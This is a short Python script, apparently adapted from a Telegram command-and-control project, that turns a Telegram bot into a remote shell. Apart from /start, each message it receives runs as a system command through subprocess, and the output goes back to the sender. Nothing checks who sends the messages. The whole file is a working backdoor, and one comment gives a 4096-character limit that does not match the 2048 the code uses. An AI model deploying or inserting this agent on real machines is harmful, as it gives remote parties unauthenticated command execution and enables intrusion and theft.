#inspired from https://github.com/Tomiwa-Ot/telegram-c2/blob/master/main.py

import telebot
import subprocess

API_KEY = "REDACTED_API_KEY"
bot = telebot.TeleBot(API_KEY)

def execute_system_command(cmd):
    max_message_length = 2048
    output = subprocess.getstatusoutput(cmd)

    # Shorten response if greater than 4096 characters
    if len(output[1]) > max_message_length:
        return str(output[1][:max_message_length])
    
    return str(output[1])
# Handle any command
@bot.message_handler()
def handle_any_command(message):
    
    if message.text.startswith("/start"):
        return
    
    response = execute_system_command(message.text)
    bot.reply_to(message, response)


bot.infinity_polling()
